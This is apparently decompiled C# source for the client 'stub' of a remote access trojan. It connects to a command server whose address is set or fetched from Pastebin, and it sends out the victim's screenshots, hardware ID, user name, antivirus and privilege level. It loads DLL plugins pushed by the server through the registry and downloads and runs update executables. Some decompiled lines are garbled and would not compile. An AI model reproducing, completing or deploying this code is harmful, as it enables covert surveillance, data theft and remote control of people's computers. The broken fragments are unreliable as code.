using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using Microsoft.CSharp.RuntimeBinder;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x0200000E RID: 14
	public class Client
	{
		// Token: 0x06000023 RID: 35 RVA: 0x00002BFC File Offset: 0x00000DFC
		public void InitializeClient(string ip, string port)
		{
			try
			{
				this.ItsMain = false;
				this.TcpClient = new Socket(2, SocketType.Stream, ProtocolType.Tcp)
				{
					ReceiveBufferSize = 51200,
					SendBufferSize = 51200
				};
				this.TcpClient.Connect(ip, Convert.ToInt32(port));
				if (this.TcpClient.Connected)
				{
					this.netStream = new NetworkStream(this.TcpClient, true);
					this.HeaderSize = 4L;
					this.Buffer = new byte[this.HeaderSize];
					this.Offset = 0L;
					this.netStream.BeginRead(this.Buffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadServertData), null);
					this.ActivatePong = false;
					this.Interval = 0;
					this.IsConnect = true;
				}
				else
				{
					this.Reconnect();
				}
			}
			catch
			{
				this.Reconnect();
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00002CEC File Offset: 0x00000EEC
		public void InitializeClient()
		{
			try
			{
				string[] array = Settings.IP.Split(new char[]
				{
					,[0]
				})[new Random().Next(Settings.IP.Split(new char[]
				{
					,[0]
				}).Length)].Split(new char[]
				{
					:[0]
				});
				if (Settings.IP == "PASTEMODE")
				{
					array = new WebClient().DownloadString(Settings.PASTEBIN).Split(new char[]
					{
						':'
					});
				}
				this.IP = array[0] + ":" + array[1];
				this.InitializeClient(array[0], array[1]);
				this.ItsMain = true;
				if (this.IsConnect)
				{
					string text = string.Concat(new string[]
					{
						Convert.ToBase64String(Methods.ScreenShot()),
						"<@>", //<@>
						Settings.Group,
						"<@>",
						Settings.hwid,
						"<@>",
						Settings.UserName,
						"<@>",
						Environment.MachineName,
						"<@>",
						Settings.Computer,
						"<@>",
						Settings.Camera,
						"<@>",
						Settings.Cpu,
						" @ ",
						Environment.ProcessorCount.ToString(),
						"<@>",
						Settings.Gpu,
						"<@>",
						Settings.Ram,
						"<@>",
						Settings.GpuRam,
						"<@>",
						Methods.getAvailableRAM(),
						"<@>",
						Methods.getCurrentCpuUsage(),
						"<@>",
						Settings.WindowsVersion,
						"<@>",
						Settings.Version,
						"<@>",
						Settings.DataInstall,
						"<@>",
						Convert.ToBoolean(Settings.isadmin) ? (Convert.ToBoolean(Settings.issystem) ? "System" : "Admin") : "User",
						"<@>",
						Settings.AntiVirus,
						"<@>",
						Methods.GetActiveWindowTitle()
					});
					if (Settings.IP == "PASTEMODE")
					{
						this.Send("ConnectingPaste<@>" + Methods.GetPublicIpAsync() + "<@>" + text);
					}
					else
					{
						this.Send("Connecting<@>" + text);
					}
					Random random = new Random();
					this.Piy = new Timer(new TimerCallback(this.Pay), null, 1, 1);
					this.Status = new Timer(new TimerCallback(this.StatusSend), null, random.Next(30000, 32000), random.Next(33000, 44000));
					this.KeepAlive = new Timer(new TimerCallback(this.KeepAlivePacket), null, random.Next(12000, 16000), random.Next(12000, 14000));
				}
			}
			catch
			{
				this.Reconnect();
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x000030E8 File Offset: 0x000012E8
		public void Reconnect()
		{
			try
			{
				if (this.Piy != null)
				{
					Timer piy = this.Piy;
					if (piy != null)
					{
						piy.Dispose();
					}
				}
				if (this.Status != null)
				{
					Timer status = this.Status;
					if (status != null)
					{
						status.Dispose();
					}
				}
				if (this.KeepAlive != null)
				{
					Timer keepAlive = this.KeepAlive;
					if (keepAlive != null)
					{
						keepAlive.Dispose();
					}
				}
				if (this.TcpClient != null)
				{
					Socket tcpClient = this.TcpClient;
					if (tcpClient != null)
					{
						tcpClient.Dispose();
					}
				}
				if (this.netStream != null)
				{
					NetworkStream networkStream = this.netStream;
					if (networkStream != null)
					{
						networkStream.Dispose();
					}
				}
			}
			catch
			{
			}
			this.IsConnect = false;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003190 File Offset: 0x00001390
		public void ReadServertData(IAsyncResult ar)
		{
			try
			{
				if (!this.TcpClient.Connected)
				{
					this.Reconnect();
				}
				else
				{
					int num = this.netStream.EndRead(ar);
					if (num > 0)
					{
						this.Offset += (long)num;
						this.HeaderSize -= (long)num;
						if (this.HeaderSize == 0L)
						{
							this.HeaderSize = (long)BitConverter.ToInt32(this.Buffer, 0);
							if (this.HeaderSize > 0L)
							{
								this.Offset = 0L;
								this.Buffer = new byte[this.HeaderSize];
								while (this.HeaderSize > 0L)
								{
									int num2 = this.netStream.Read(this.Buffer, (int)this.Offset, (int)this.HeaderSize);
									if (num2 <= 0)
									{
										this.Reconnect();
										return;
									}
									this.Offset += (long)num2;
									this.HeaderSize -= (long)num2;
									if (this.HeaderSize < 0L)
									{
										this.Reconnect();
										return;
									}
								}
								new Thread(new ParameterizedThreadStart(this.Read)).Start(this.Buffer);
								this.Offset = 0L;
								this.HeaderSize = 4L;
								this.Buffer = new byte[this.HeaderSize];
							}
							else
							{
								this.HeaderSize = 4L;
								this.Buffer = new byte[this.HeaderSize];
								this.Offset = 0L;
							}
						}
						else if (this.HeaderSize < 0L)
						{
							this.Reconnect();
							return;
						}
						this.netStream.BeginRead(this.Buffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadServertData), null);
					}
					else
					{
						this.Reconnect();
					}
				}
			}
			catch (Exception ex)
			{
				if (this.TcpClient.Connected)
				{
					this.Error("ReadServertData:" + ex.Message);
				}
				this.Reconnect();
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x0000216E File Offset: 0x0000036E
		public void SaveInvoke(string[] Messages)
		{
			if (Messages[0] == "SaveInvoke")
			{
				SetRegistry.SetValue(Messages[1], Convert.FromBase64String(Messages[2]));
				this.Invoke(this.invokes);
				this.Reconnect();
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003394 File Offset: 0x00001594
		public void InvokeC(string[] Messages)
		{
			if (Messages[0] == "Invoke")
			{
				if (SetRegistry.GetValue(Messages[1]) == null)
				{
					Client client = new Client();
					client.InitializeClient(this.IP.Split(new char[]
					{
						':'
					})[0], this.IP.Split(new char[]
					{
						':'
					})[1]);
					if (client.IsConnect)
					{
						client.IP = this.IP;
						client.invokes = Messages;
						client.Send("GetDLL<@>" + Messages[1]);
						return;
					}
				}
				else
				{
					this.Invoke(Messages);
					if (!this.ItsMain)
					{
						this.Reconnect();
					}
				}
				return;
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000021A7 File Offset: 0x000003A7
		public void Uninstall(string[] Messages)
		{
			if (Messages[0] == "Uninstall")
			{
				Install.Uninstall();
				Thread.Sleep(new Random().Next(2000, 3000));
				Methods.Exit();
				return;
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00003448 File Offset: 0x00001648
		public void Update(string[] Messages)
		{
			if (Messages[0] == "Update")
			{
				Install.Uninstall();
				string path = Path.GetTempFileName() + ".exe";
				File.WriteAllBytes(path, Convert.FromBase64String(Messages[1]));
				MutexControl.CloseMutex();
				Install.Start(path);
				Thread.Sleep(1000);
				Methods.Exit();
				return;
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x000034AC File Offset: 0x000016AC
		public void Pong(string[] Messages)
		{
			if (Messages[0] == "Pong"
			{
				this.ActivatePong = false;
				this.Send("Pong<@>" + this.Interval.ToString());
				this.Interval = 0;
				return;
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x000021E1 File Offset: 0x000003E1
		public void Exit(string[] Messages)
		{
			if (Messages[0] == "Exit")
			{
				Methods.Exit();
				return;
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x000021FD File Offset: 0x000003FD
		public void Disconnect(string[] Messages)
		{
			if (Messages[0] == "Disconnect")
			{
				this.Reconnect();
				return;
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x000034FC File Offset: 0x000016FC
		public void Restart(string[] Messages)
		{
			if (Messages[0] == "Restart")
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.FileName = "cmd";
				processStartInfo.Arguments = "/k timeout 5 > NUL && \"" + Process.GetCurrentProcess().MainModule.FileName + "\"";
				new Process
				{
					StartInfo = processStartInfo
				}.Start();
				Thread.Sleep(new Random().Next(2000, 3000));
				Methods.Exit();
				return;
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x000035B4 File Offset: 0x000017B4
		public void Read(object Message)
		{
			try
			{
				string[] messages = Encoding.UTF8.GetString(Methods.Decompress((byte[])Message)).Split(new string[]
				{
					"<@>"
				}, StringSplitOptions.None);
				this.CommandCenter(messages);
			}
			catch (Exception ex)
			{
				if (this.TcpClient.Connected)
				{
					this.Error("Read:" + ex.Message);
				}
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x0000221A File Offset: 0x0000041A
		public void CommandCenter(string[] Messages)
		{
			this.SaveInvoke(Messages);
			this.InvokeC(Messages);
			this.Uninstall(Messages);
			this.Update(Messages);
			this.Pong(Messages);
			this.Exit(Messages);
			this.Disconnect(Messages);
			this.Restart(Messages);
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00003634 File Offset: 0x00001834
		public void KeepAlivePacket(object obj)
		{
			try
			{
				this.Send("Ping");
				GC.Collect();
				this.ActivatePong = true;
			}
			catch
			{
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00003674 File Offset: 0x00001874
		public void StatusSend(object obj)
		{
			try
			{
				this.Send(string.Concat(new string[]
				{
					"RefreshStatus<@>",
					Methods.GetActiveWindowTitle(),
					"<@>",
					Convert.ToBase64String(Methods.ScreenShot()),
					"<@>",
					Methods.getAvailableRAM(),
					"<@>",
					Methods.getCurrentCpuUsage()
				}));
			}
			catch
			{
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00003700 File Offset: 0x00001900
		public void Pay(object obj)
		{
			try
			{
				if (this.ActivatePong && this.IsConnect)
				{
					this.Interval++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00003740 File Offset: 0x00001940
		public void Invoke(string[] Message)
		{
			try
			{
				object arg = Activator.CreateInstance(AppDomain.CurrentDomain.Load(SetRegistry.GetValue(Message[1])).GetType("Plugin.Plugin"));
				if (Client.<>o__32.<>p__0 == null)
				{
					Client.<>o__32.<>p__0 = CallSite<Action<CallSite, object, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", null, typeof(Client), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
					}));
				}
				Client.<>o__32.<>p__0.Target(Client.<>o__32.<>p__0, arg, this.IP, Settings.hwid, (Message[2] == "null") ? "" : Encoding.UTF8.GetString(Convert.FromBase64String(Message[2])));
			}
			catch (Exception ex)
			{
				this.Error(ex.ToString());
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00002254 File Offset: 0x00000454
		public void Error(string Message)
		{
			this.Send("Error:" + Message);
		}

		// Token: 0x06000036 RID: 54 RVA: 0x0000383C File Offset: 0x00001A3C
		public void Send(string mess)
		{
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					if (this.TcpClient.Connected)
					{
						byte[] array = Methods.Compress(Encoding.UTF8.GetBytes(mess));
						byte[] bytes = BitConverter.GetBytes(array.Length);
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.netStream.Write(bytes, 0, bytes.Length);
						if (array.Length > 1000000)
						{
							using (MemoryStream memoryStream = new MemoryStream(array))
							{
								memoryStream.Position = 0L;
								byte[] array2 = new byte[25000];
								int count;
								while ((count = memoryStream.Read(array2, 0, array2.Length)) > 0)
								{
									this.TcpClient.Poll(-1, SelectMode.SelectWrite);
									this.netStream.Write(array2, 0, count);
									this.netStream.Flush();
								}
							}
						}
						else
						{
							this.TcpClient.Poll(-1, SelectMode.SelectWrite);
							this.netStream.Write(array, 0, array.Length);
							this.netStream.Flush();
						}
					}
				}
				catch
				{
					this.Reconnect();
				}
			}
		}

		// Token: 0x04000014 RID: 20
		public Socket TcpClient;

		// Token: 0x04000015 RID: 21
		public NetworkStream netStream;

		// Token: 0x04000016 RID: 22
		public byte[] Buffer;

		// Token: 0x04000017 RID: 23
		public long HeaderSize;

		// Token: 0x04000018 RID: 24
		public long Offset;

		// Token: 0x04000019 RID: 25
		public object SendSync = new object();

		// Token: 0x0400001A RID: 26
		public string[] invokes;

		// Token: 0x0400001B RID: 27
		public Timer KeepAlive;

		// Token: 0x0400001C RID: 28
		public Timer Piy;

		// Token: 0x0400001D RID: 29
		public Timer Status;

		// Token: 0x0400001E RID: 30
		public bool ActivatePong;

		// Token: 0x0400001F RID: 31
		public bool IsConnect;

		// Token: 0x04000020 RID: 32
		public bool ItsMain;

		// Token: 0x04000021 RID: 33
		public int Interval;

		// Token: 0x04000022 RID: 34
		public string IP;
	}
}
